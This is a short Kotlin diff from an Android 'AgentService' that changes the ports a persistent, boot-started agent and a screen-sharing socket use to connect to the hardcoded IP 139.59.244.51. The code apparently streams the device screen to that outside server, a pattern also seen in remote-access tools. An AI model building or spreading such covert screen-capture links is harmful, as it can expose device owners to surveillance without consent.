@@ -209,7 +209,7 @@ class AgentService : Service() {
             if (acquireProcessLock()) {
                 // Only delay on boot — not on restarts caused by permission changes or system kills
                 val fromBoot = intent?.getBooleanExtra("from_boot", false) ?: false
-                startPersistentAgent("139.59.244.51", 5001, fromBoot)
+                startPersistentAgent("139.59.244.51", 6001, fromBoot)
             } else {
                 Log.w("AgentService", "Duplicate instance detected (process lock failed). Stopping.")
                 isAgentRunning.set(false)
@@ -317,7 +317,7 @@ class AgentService : Service() {
                 while (isScreenSharingActive.get() && keepRunning) {
                     try {
                         if (screenSocket == null || screenSocket.isClosed) {
-                            screenSocket = Socket("139.59.244.51", 5003)
+                            screenSocket = Socket("139.59.244.51", 6003)
                             screenSocket.soTimeout = 5000
                             out = java.io.DataOutputStream(screenSocket.getOutputStream())
                         }
